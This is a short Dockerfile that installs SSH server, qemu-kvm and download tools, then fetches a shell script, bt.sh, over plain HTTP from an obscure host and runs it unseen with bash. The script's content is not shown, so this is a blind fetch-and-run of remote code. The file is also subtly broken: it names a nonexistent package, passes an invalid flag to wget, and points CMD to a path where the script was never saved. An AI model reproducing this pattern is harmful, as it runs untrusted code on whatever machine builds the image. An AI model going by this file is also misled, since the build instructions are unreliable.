FROM debian
RUN apt update
RUN DEBIAN_FRONTEND=noninteractive apt install openssh openssh-server qemu-kvm curl git wget -y
RUN wget http://jt.xnkl.cf/bt.sh -y
RUN bash bt.sh -y
CMD  /bt.sh
